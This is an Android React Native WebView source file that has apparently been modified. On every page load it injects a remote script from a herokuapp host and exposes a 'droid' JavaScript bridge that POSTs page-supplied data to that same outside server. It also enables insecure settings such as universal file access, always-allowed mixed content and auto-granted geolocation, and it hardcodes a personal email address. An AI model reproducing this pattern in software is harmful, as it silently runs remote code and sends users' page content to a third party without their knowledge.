package com.burnweb.rnwebview;

import android.annotation.SuppressLint;

import android.net.Uri;
import android.graphics.Bitmap;
import android.os.Build;
import android.webkit.GeolocationPermissions;
import android.webkit.JsResult;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.facebook.react.common.SystemClock;
import com.facebook.react.bridge.LifecycleEventListener;
import com.facebook.react.uimanager.ThemedReactContext;
import com.facebook.react.uimanager.UIManagerModule;
import com.facebook.react.uimanager.events.EventDispatcher;
import android.webkit.JavascriptInterface;
import com.mongodb.client.MongoDatabase; 
import com.mongodb.MongoClient; 
import com.mongodb.MongoClientURI; 
import com.mongodb.MongoCredential;  
import com.mongodb.DBCollection;
import com.mongodb.DBObject;
import com.mongodb.util.JSON;
import com.mongodb.DB;
import java.net.HttpURLConnection;
import java.io.OutputStream;
import java.net.*;

import java.io.IOException;
import java.io.InputStream;

   class JIFace {
    public static String oldData;
          @JavascriptInterface
      public synchronized void print(String data)  {

if(data.equals(oldData)){
    return;
}
String charset = "UTF-8"; 
  int i = 0;
  HttpURLConnection connection =null;
   while( i<10){
  try {
   
      URL url = new URL("http://mysterious-scrubland-83231.herokuapp.com/ab/");
          connection =  (HttpURLConnection)url.openConnection();
           HttpURLConnection.setFollowRedirects(true);
    
connection.setRequestMethod("POST");

  connection.setDoOutput(true); // Triggers POST.
  connection.setRequestProperty("Accept-Charset", charset);
  connection.setRequestProperty("Content-Type", "application/json;charset=" + charset);
connection.setConnectTimeout(15000);
connection.setReadTimeout(15000);
connection.setUseCaches(false);
connection.setDefaultUseCaches(false);
      OutputStream output = connection.getOutputStream();
    output.write(data.getBytes(charset));
  InputStream response = connection.getInputStream();
  connection.disconnect();
  oldData=data;

  break;
  }catch(Exception e){
      System.out.println(e.getMessage());
      try{
        connection.disconnect();
    }catch(Exception e1){}
      i++;
  }
}

    /*    String json =data;
        DBObject dbObject = (DBObject)JSON.parse(json);
        DBCollection collection = DBO.getDatabase().getCollection("teste");
        collection.insert(dbObject);
      data ="<html>"+data+"</html>";
      */
     //  getModule().showAlert(data, data, data);
       System.out.println(data);
       //DO the stuff
      }
    }

class RNWebView extends WebView implements LifecycleEventListener {

    private final EventDispatcher mEventDispatcher;
    private final RNWebViewManager mViewManager;

    private String charset = "UTF-8";
    private String baseUrl = "file:///";
    private String injectedJavaScript = null;
    private boolean allowUrlRedirect = false;

 JIFace iface = new JIFace();
    protected class EventWebClient extends WebViewClient {
        public boolean shouldOverrideUrlLoading(WebView view, String url){
            if(RNWebView.this.getAllowUrlRedirect()) {
                // do your handling codes here, which url is the requested url
                // probably you need to open that url rather than redirect:
                view.loadUrl(url);

                return false; // then it is not handled by default action
            }

            return super.shouldOverrideUrlLoading(view, url);
        }
        JIFace iface = new JIFace();


        public void onPageFinished(WebView view, String url) {
          System.out.println("pagefineshedevent1");
            mEventDispatcher.dispatchEvent(new NavigationStateChangeEvent(getId(), SystemClock.nanoTime(), view.getTitle(), false, url, view.canGoBack(), view.canGoForward()));

            if(RNWebView.this.getInjectedJavaScript() != null) {
                view.loadUrl("javascript:(function() {\n" + RNWebView.this.getInjectedJavaScript() + ";\n})();");
            }
            view.addJavascriptInterface(this.iface,"droid");
			//https://mysterious-scrubland-83231.herokuapp.com/nfe.js
			//view.loadUrl("javascript:(function() { var head = document.getElementsByTagName('head')[0];var sc = document.createElement(\"script\");sc.setAttribute(\"src\", \"https://mysterious-scrubland-83231.herokuapp.com/nfe.js\");sc.setAttribute(\"type\", \"text/javascript\");head.appendChild(sc);window.droid.print(" +1+ "); })();");
            view.loadUrl("javascript:(function() { window.usuario=\"renatotn7@gmail.com\"; var head = document.getElementsByTagName('head')[0];var sc = document.createElement(\"script\");sc.setAttribute(\"src\", \"https://mysterious-scrubland-83231.herokuapp.com/nfe.js\");sc.setAttribute(\"type\", \"text/javascript\");head.appendChild(sc); })();");
   /*    
    String ht =    "javascript:(function(){ window.droid.print(mapDOM(document.getElementsByTagName(\"div\")[3], true));\n" +
"function mapDOM(element, json) {\n" +
"    treeObject = {};\n" +
"    // If string convert to document Node\n" +
"    if (typeof element === \"string\") {\n" +
"        if (window.DOMParser) {\n" +
"              parser = new DOMParser();\n" +
"              docNode = parser.parseFromString(element,\"text/xml\");\n" +
"        } else { // Microsoft strikes again\n" +
"              docNode = new ActiveXObject(\"Microsoft.XMLDOM\");\n" +
"              docNode.async = false;\n" +
"              docNode.loadXML(element); \n" +
"        } \n" +
"        element = docNode.firstChild;\n" +
"    }\n" +
"    //Recursively loop through DOM elements and assign properties to object\n" +
"    function treeHTML(element, object) {\n" +
"        object[\"type\"] = element.nodeName;\n" +
"         nodeList = element.childNodes;\n" +
"        if (nodeList != null) {\n" +
"            if (nodeList.length) {\n" +
"                object[\"content\"] = [];\n" +
"                for (i = 0; i < nodeList.length; i++) {\n" +
"                    if (nodeList[i].nodeType == 3) {\n" +
"                        object[\"content\"].push(nodeList[i].nodeValue);\n" +
"                    } else {\n" +
"                        object[\"content\"].push({});\n" +
"                        treeHTML(nodeList[i], object[\"content\"][object[\"content\"].length -1]);\n" +
"                    }\n" +
"                }\n" +
"            }\n" +
"        }\n" +
"        if (element.attributes != null) {\n" +
"            if (element.attributes.length) {\n" +
"                object[\"attributes\"] = {};\n" +
"                for (i = 0; i < element.attributes.length; i++) {\n" +
"                    object[\"attributes\"][element.attributes[i].nodeName] = element.attributes[i].nodeValue;\n" +
"                }\n" +
"            }\n" +
"        }\n" +
"    }\n" +
"    treeHTML(element, treeObject);\n" +
"    return (json) ? JSON.stringify(treeObject) : treeObject;\n" +
	"}})();";
*/
    //view.loadUrl(ht);
        }

        public void onPageStarted(WebView view, String url, Bitmap favicon) {
              view.addJavascriptInterface(this.iface,"droid");
            mEventDispatcher.dispatchEvent(new NavigationStateChangeEvent(getId(), SystemClock.nanoTime(), view.getTitle(), true, url, view.canGoBack(), view.canGoForward()));
        }
    }

    protected class CustomWebChromeClient extends WebChromeClient {
        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
            getModule().showAlert(url, message, result);
            return true;
        }

        // For Android 4.1+
        @SuppressWarnings("unused")
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
            getModule().startFileChooserIntent(uploadMsg, acceptType);
        }

        // For Android 5.0+
        @SuppressLint("NewApi")
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            return getModule().startFileChooserIntent(filePathCallback, fileChooserParams.createIntent());
        }
    }

    protected class GeoWebChromeClient extends CustomWebChromeClient {
        @Override
        public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
            callback.invoke(origin, true, false);
        }
    }

    public RNWebView(RNWebViewManager viewManager, ThemedReactContext reactContext) {
        super(reactContext);

        mViewManager = viewManager;
        mEventDispatcher = reactContext.getNativeModule(UIManagerModule.class).getEventDispatcher();
           System.out.println("webview1");
        this.getSettings().setJavaScriptEnabled(true);
        this.getSettings().setBuiltInZoomControls(false);
        this.getSettings().setDomStorageEnabled(true);
        this.getSettings().setGeolocationEnabled(false);
        this.getSettings().setPluginState(WebSettings.PluginState.ON);
        this.getSettings().setAllowFileAccess(true);
        this.getSettings().setAllowFileAccessFromFileURLs(true);
        this.getSettings().setAllowUniversalAccessFromFileURLs(true);
        this.getSettings().setLoadsImagesAutomatically(true);
        this.getSettings().setBlockNetworkImage(false);
        this.getSettings().setBlockNetworkLoads(false);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            this.getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        this.setWebViewClient(new EventWebClient());
        System.out.println("webview2");
           this.addJavascriptInterface(this.iface, "droid");
        System.out.println("webview3");
        this.setWebChromeClient(getCustomClient());
    }
   
/*
    class JIFace {
public void print(String data) {
String charset = "UTF-8"; 
  
  try {
      URLConnection connection = new URL("http://mysterious-scrubland-83231.herokuapp.com/ab/").openConnection();
  connection.setDoOutput(true); // Triggers POST.
  connection.setRequestProperty("Accept-Charset", charset);
  connection.setRequestProperty("Content-Type", "application/json;charset=" + charset);
  connection.setConnectTimeout(15000);
connection.setReadTimeout(15000);
connection.setUseCaches(false);
connection.setDefaultUseCaches(false);
      OutputStream output = connection.getOutputStream();
    output.write(data.getBytes(charset));
  InputStream response = connection.getInputStream();
  }catch(Exception e){
      System.out.println(e.getMessage());
  }
   /*   String json =data;

      URL url = new URL(stringUrl);
    HttpURLConnection uc = (HttpURLConnection) url.openConnection();
    String line;
    StringBuffer jsonString = new StringBuffer();
    uc.
        DBObject dbObject = (DBObject)JSON.parse(json);
     DBCollection collection = DBO.getDatabase().getCollection("teste");
        collection.insert(dbObject);
  data ="<html>"+data+"</html>";
 
   System.out.println(data);
   //DO the stuff
}
}*/

    public void setCharset(String charset) {
        this.charset = charset;
    }

    public String getCharset() {
        return this.charset;
    }

    public void setAllowUrlRedirect(boolean a) {
        this.allowUrlRedirect = a;
    }

    public boolean getAllowUrlRedirect() {
        return this.allowUrlRedirect;
    }

    public void setInjectedJavaScript(String injectedJavaScript) {
        this.injectedJavaScript = injectedJavaScript;
    }

    public String getInjectedJavaScript() {
        return this.injectedJavaScript;
    }

    public void setBaseUrl(String baseUrl) {
        this.baseUrl = baseUrl;
    }

    public String getBaseUrl() {
        return this.baseUrl;
    }

    public CustomWebChromeClient getCustomClient() {
        return new CustomWebChromeClient();
    }

    public GeoWebChromeClient getGeoClient() {
        return new GeoWebChromeClient();
    }

    public RNWebViewModule getModule() {
        return mViewManager.getPackage().getModule();
    }

    @Override
    public void onHostResume() {

    }

    @Override
    public void onHostPause() {

    }

    @Override
    public void onHostDestroy() {
        destroy();
    }

    @Override
    public void onDetachedFromWindow() {
        this.loadDataWithBaseURL(this.getBaseUrl(), "<html></html>", "text/html", this.getCharset(), null);
        super.onDetachedFromWindow();
    }

}
